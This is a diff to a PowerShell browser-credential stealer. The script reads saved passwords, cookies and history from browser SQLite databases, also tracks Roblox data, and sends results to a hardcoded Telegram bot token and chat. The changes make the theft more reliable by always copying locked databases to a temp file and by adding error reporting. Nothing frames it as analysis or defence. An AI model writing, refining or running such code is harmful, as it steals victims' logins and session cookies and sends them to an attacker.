@@ -2,10 +2,10 @@ $tgToken = "8827121220:AAHL7S675bKJdGcFlUULSUlNWOgGPfSla4U"
 $tgChat = "-1003960241194"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $tgBase = "https://api.telegram.org/bot$tgToken"
-$b = [char]0x3C; $B = [char]0x3E
+$lt = [char]0x3C; $gt = [char]0x3E
 
 function ts($m) {
-  $t = "${b}b${B}${m}${b}/b${B}"
+  $t = "${lt}b${gt}${m}${lt}/b${gt}"
   $j = @{chat_id=$tgChat;text=$t;parse_mode="HTML";disable_web_page_preview=$true} | ConvertTo-Json
   for ($i = 0; $i -lt 3; $i++) {
     try { Invoke-RestMethod -Uri "$tgBase/sendMessage" -Method Post -Body $j -ContentType "application/json" -TimeoutSec 15 -ErrorAction Stop | Out-Null; break }
@@ -116,9 +116,6 @@ foreach ($browser in $browsers) {
   $bpw = 0; $bck = 0; $bhist = 0; $bRoblox = $null; $errMsg = $null
 
   function openDb($dbPath) {
-    $ptr = [IntPtr]::Zero
-    $rc = [N]::sqlite3_open_v2($dbPath, [ref]$ptr, 1, [IntPtr]::Zero)
-    if ($rc -eq 0) { return $ptr }
     try {
       $tmp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).db"
       $fs = [System.IO.File]::Open($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
@@ -126,6 +123,7 @@ foreach ($browser in $browsers) {
       $fs.Read($buf, 0, $fs.Length) | Out-Null
       $fs.Close()
       [System.IO.File]::WriteAllBytes($tmp, $buf)
+      $ptr = [IntPtr]::Zero
       $rc = [N]::sqlite3_open_v2($tmp, [ref]$ptr, 1, [IntPtr]::Zero)
       if ($rc -eq 0) { return $ptr }
       Remove-Item $tmp -Force -ErrorAction SilentlyContinue
@@ -162,7 +160,7 @@ foreach ($browser in $browsers) {
               }
             }
             [N]::sqlite3_finalize($stmt)
-          }
+          } else { $errMsg = "Login Data query error" }
           [N]::sqlite3_close($dbPtr)
         } else { $errMsg = "Cannot access Login Data" }
       } catch { $errMsg = "Login DB error: $_" }
@@ -196,7 +194,7 @@ foreach ($browser in $browsers) {
               }
             }
             [N]::sqlite3_finalize($stmt)
-          }
+          } else { $errMsg = "Cookies query error" }
           [N]::sqlite3_close($dbPtr)
         } else { $errMsg = "Cannot access Cookies DB" }
       } catch { $errMsg = "Cookie DB error: $_" }
@@ -213,7 +211,7 @@ foreach ($browser in $browsers) {
               if ($cntPtr -ne [IntPtr]::Zero) { $bhist += [int][Runtime.InteropServices.Marshal]::PtrToStringAnsi($cntPtr); $histCount += $bhist }
             }
             [N]::sqlite3_finalize($stmt)
-          }
+          } else { $errMsg = "History query error" }
           [N]::sqlite3_close($dbPtr)
         } else { $errMsg = "Cannot access History DB" }
       } catch { $errMsg = "History DB error: $_" }
